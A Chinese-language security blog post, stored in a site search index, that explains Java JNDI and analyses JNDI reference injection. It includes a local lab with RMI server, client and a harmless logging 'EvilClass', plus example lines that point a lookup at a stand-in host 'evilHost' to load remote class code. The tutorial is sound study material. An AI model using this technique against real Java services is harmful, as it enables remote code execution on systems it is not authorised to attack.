<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JNDI注入分析</title>
    <link href="/Decemberus.github-io/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/Decemberus.github-io/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。<br><code>JNDI</code>是<code>Java EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><h3 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h3><p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：<code>DNS</code>系统将计算机名和<code>IP</code>地址进行关联、文件系统将文件名和文件句柄进行关联等等。<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。<br>其中另一个值得一提的名称服务为 <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name</code>&#x2F;<code>value</code> 对，以等号分隔。比如一个 <code>LDAP</code> 名称如下:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure><p>即表示在 <code>c=US</code> 的子域中查找 <code>o=Sun</code> 的子域，再在结果中查找 <code>cn=John</code> 的对象。关于 <code>LDAP</code> 的详细介绍见后文。</p><p>在名称系统中，有几个重要的概念。<br><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。<br><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。<br><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p><h3 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。<br>一些典型的目录服务有:<br><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；<br><code>Active Directory</code>: 为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；<br>其他基于 <code>LDAP</code> 协议实现的目录服务；<br>总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。<br>在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。在 <code>Java</code> 应用中除了以常规方式使用名称服务(比如使用 <code>DNS</code> 解析域名)，另一个常见的用法是使用目录服务作为对象存储的系统，即用目录服务来存储和获取 <code>Java</code> 对象。<br>比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 <code>Java</code> 对象进行实际的打印操作。<br>为此，就有了 <code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。<br><code>JNDI</code> 架构上主要包含两个部分，即 <code>Java</code> 的应用层接口和 <code>SPI</code>，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png" alt="JNDI架构图.png"> </p><p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 <code>JDK</code> 中包含了下述内置的目录服务:<br><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；<br><code>LDAP</code>: 轻量级目录访问协议；<br><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；<br>除此之外，用户还可以在 <code>Java</code> 官网下载其他目录服务实现。由于 <code>SPI</code> 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。<br>为了更好理解 <code>JNDI</code>，我们需要了解其背后的服务提供者(<code>Service Provider</code>)，这些目录服务本身和 <code>JNDI</code> 有没直接耦合性，但基于 <code>SPI</code> 接口和 <code>JNDI</code> 构建起了重要的联系。</p><h2 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。<br>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<br></code></pre></td></tr></table></figure><h3 id="类介绍"><a href="#类介绍" class="headerlink" title="类介绍"></a>类介绍</h3><h4 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h4><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext();<br><span class="hljs-comment">//构建一个初始上下文</span><br>InitialContext();<br><span class="hljs-comment">//构建上下文并选择不初始化它</span><br>InitialContext(Hashtable&lt;?,?&gt; environment)<br><span class="hljs-comment">//使用提供的环境构建初始上下文</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将名称绑定到对象。 </span><br>bind(Name name, Object obj) <br><span class="hljs-comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br>list(String name) <br><span class="hljs-comment">//检索命名对象。</span><br>lookup(String name)  <br><span class="hljs-comment">//将名称绑定到对象，覆盖任何现有绑定。</span><br>rebind(String name, Object obj) <br><span class="hljs-comment">//取消绑定命名对象。</span><br>unbind(String name)  <br></code></pre></td></tr></table></figure><p>实例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ini</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        ini.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中lookup会去uri中查找对应对象并返回引用</p><h4 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h4><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了<code>JNDI</code>中类的引用功能。</p><p>构造方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为类名为“className”的对象构造一个新的引用。</span><br>Reference(String className) <br><span class="hljs-comment">//为类名为“className”的对象和地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr) <br><span class="hljs-comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr, String factory, String factoryLocation) <br><span class="hljs-comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br>Reference(String className, String factory, String factoryLocation)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数：</span><br><span class="hljs-comment">className 远程加载时所使用的类名(引用名称)</span><br><span class="hljs-comment">factory  加载的class中需要实例化类的名称（引用类型）</span><br><span class="hljs-comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将地址添加到索引posn的地址列表中。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> <br><span class="hljs-comment">//将地址添加到地址列表的末尾。 </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> <br><span class="hljs-comment">//从此引用中删除所有地址。  </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索索引posn上的地址。 </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索地址类型为“addrType”的第一个地址。  </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> <br><span class="hljs-comment">//检索本参考文献中地址的列举。 </span><br>Enumeration&lt;RefAddr&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索引用引用的对象的类名。 </span><br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用的对象的工厂位置。  </span><br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用对象的工厂的类名。  </span><br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//从地址列表中删除索引posn上的地址。    </span><br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索此引用中的地址数。 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//生成此引用的字符串表示形式。</span><br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Renference</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;rmi://127.0.0.1:8080&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">renference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(renference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要问题在于为何使用了<code>ReferenceWrapper</code></p><p>因为<code>Reference</code>类没有实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类，所以需要用<code>ReferenceWrapper</code>封装一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ReferenceWrapper.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReferenceWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteReference</span> &#123;<br>    <span class="hljs-keyword">protected</span> Reference wrappee;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6078186197417641456L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReferenceWrapper</span><span class="hljs-params">(Reference var1)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-built_in">this</span>.wrappee = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappee;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>关于继承<code>UnicastRemoteObject</code>的原因</p><p>在Java RMI中，要将一个远程对象导出（即使其成为远程可调用的对象），需要将其扩展为<code>java.rmi.server.UnicastRemoteObject</code>类的子类。这是因为<code>UnicastRemoteObject</code>类提供了一些必要的支持，使得对象能够在远程机器上进行调用。</p><p>具体来说，当一个Java对象通过RMI被远程调用时，需要进行序列化（即将对象转换成一系列字节，以便在网络上传输），然后将序列化后的字节传输到远程机器上进行反序列化（即将字节重新转换成对象）。<code>UnicastRemoteObject</code>类提供了默认的序列化和反序列化机制，以及一些基础的RMI支持。</p></blockquote><h2 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h2><p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。<br>引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。<br><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p><p>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用<br>在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名&#x2F;目录系统以外的对象的引用。<br>具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class</code> 字节码文件来实例化</p><p><code>Reference</code> 类常用属性：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">className 远程加载时所使用的类名<br>classFactory 加载的 <span class="hljs-keyword">class</span> 中需要实例化类的名称<br><span class="hljs-symbol">classFactoryLocation</span> 提供 <span class="hljs-symbol">classes</span> 数据的地址可以是 <span class="hljs-symbol">file</span>/<span class="hljs-symbol">ftp</span>/<span class="hljs-symbol">http</span> 等协议<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> );           <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>此时，假设使用 <code>rmi</code> 协议，客户端通过 <code>lookup</code> 函数请求上面 <code>bind</code> 设置的 <code>Exploit</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Context ctx <span class="hljs-operator">=</span> new InitialContext()<span class="hljs-comment">;</span><br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a href="http://evilhost/Exploit.class">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p><h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI_RMI"></a>JNDI_RMI</h2><h3 id="低版本JDK运行"><a href="#低版本JDK运行" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Client</span><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>“foo”并不是一个类，而是在服务器端绑定到 RMI 注册表上的一个对象名称（Object name）。当客户端使用 <code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/foo&quot;)</code> 查找时，它会返回该名称下对应的对象，即 <code>EvilClass</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        String url=<span class="hljs-string">&quot;http://localhost:1098/&quot;</span>;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClass&quot;</span>, url);<br>        registry.bind(<span class="hljs-string">&quot;foo&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br>        System.out.println(<span class="hljs-string">&quot;server ready&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilClass</span><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String key)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;EvilClass&quot;</span>+key);<br>    &#125;<br><br>    &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;IIB block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在创建对象时执行</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;static block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在类第一次加载时执行</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span>  <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>python启动http服务器</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027659.png" alt="image-20230226191821488"> </p><blockquote><p>关于这里的端口号有的是1098有的是1099的疑问</p><p>这是因为在服务器端代码 <code>Server.java</code> 中，创建 <code>Reference</code> 对象时，将 <code>url</code> 参数设置为了 <code>&quot;http://localhost:1098/&quot;</code>。这个 URL 是指向一个 HTTP 服务器的地址，而在 <code>getObjectInstance</code> 方法中，并没有使用该 URL，所以在客户端代码中使用 <code>rmi://127.0.0.1:1099/foo</code> 查找时仍然可以返回正确的对象。</p><p>虽然这个示例代码中的 <code>url</code> 参数没有被实际使用到，但是实际上 <code>url</code> 参数用来指定引用对象的远程位置，这个远程位置可以是任何类型的 URL。如果您想要将 <code>url</code> 参数用于远程加载对象，则需要确保在 <code>getObjectInstance</code> 方法中能够正确地解析该 URL，加载对应的对象。</p></blockquote><p>将EvilClass的.class文件放入服务器根目录</p><p><img src="D:/mdimage/image-20230226192019661.png" alt="image-20230226192019661"> </p><p>启动服务端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027009.png" alt="image-20230226192035548"> </p><p>启动客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027472.png" alt="image-20230226192046711"> </p><h3 id="高版本JDK运行"><a href="#高版本JDK运行" class="headerlink" title="高版本JDK运行"></a>高版本JDK运行</h3><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。<br>不加参数，抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192034081.png" alt="image-20230226193613482"> 